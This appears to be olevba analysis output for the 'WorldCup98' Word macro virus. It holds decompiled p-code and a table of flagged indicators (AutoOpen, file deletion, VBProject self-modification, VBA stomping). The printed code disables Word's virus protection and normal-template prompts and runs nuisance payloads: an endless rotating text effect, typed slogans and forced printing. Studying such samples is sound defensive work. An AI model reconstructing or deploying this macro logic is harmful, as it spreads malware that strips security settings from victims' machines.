' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #179:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0062 
' 	For 
' Line #180:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #181:
' 	LitStr 0x001E "Vive la coupe du monde 98!!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #182:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #183:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #184:
' 	LitStr 0x002C "ZeMacroKiller98 aime beaucoup le football..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #185:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #186:
' 	EndSelect 
' Line #187:
' 	EndIfBlock 
' Line #188:
' 	Label ErrorPe 
' Line #189:
' 	EndSub 
' Line #190:
' 	FuncDefn (Sub ToolsMacro())
' Line #191:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #192:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #193:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #194:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #195:
' 	OnError ErrorTM 
' Line #196:
' 	LitStr 0x002E "ZeMacroKiller98 est heureux de dédier ce virus"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0020 "à tous ceux qui aime le FOOTBALL"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ArgsCall MsgBox 0x0003 
' Line #197:
' 	Label ErrorTM 
' Line #198:
' 	EndSub 
' Line #199:
' 	FuncDefn (Sub ViewVBCode())
' Line #200:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #201:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #202:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #203:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #204:
' 	OnError ErrorVVBC 
' Line #205:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #206:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #207:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #208:
' 	LitStr 0x0010 "Virus WorldCup98"
' 	MemStWith Heading 
' Line #209:
' 	LitStr 0x0014 "Allez la France!!!!!"
' 	MemStWith Then 
' Line #210:
' 	ArgsMemCallWith Show 0x0000 
' Line #211:
' 	EndWith 
' Line #212:
' 	Label ErrorVVBC 
' Line #213:
' 	EndSub 
' Line #214:
' 	FuncDefn (Private Sub WC98PayLoad())
' Line #215:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #216:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #217:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #218:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #219:
' 	OnError ErrorWC98PL 
' Line #220:
' 	Label Charge 
' Line #221:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld msoTextEffect22 
' 	LitStr 0x000C "World Cup 98"
' 	LitStr 0x0006 "Impact"
' 	LitR8 0x0000 0x0000 0x0000 0x404E 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	LitR8 0xCCCD 0xCCCC 0x84CC 0x4060 
' 	LitR8 0x3333 0x3333 0x2333 0x405E 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #222:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #223:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #224:
' 	LitR8 0x0000 0x0000 0x8000 0x4046 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #225:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #226:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #227:
' 	LitR8 0x0000 0x0000 0x8000 0x4056 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #228:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #229:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #230:
' 	LitR8 0x0000 0x0000 0xE000 0x4060 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #231:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #232:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #233:
' 	LitR8 0x0000 0x0000 0x8000 0x4066 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #234:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #235:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #236:
' 	LitR8 0x0000 0x0000 0x2000 0x406C 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #237:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #238:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #239:
' 	LitR8 0x0000 0x0000 0xE000 0x4070 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #240:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #241:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #242:
' 	LitR8 0x0000 0x0000 0xB000 0x4073 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #243:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #244:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #245:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemSt Rotation 
' Line #246:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #247:
' 	GoTo Charge 
' Line #248:
' 	Label ErrorWC98PL 
' Line #249:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

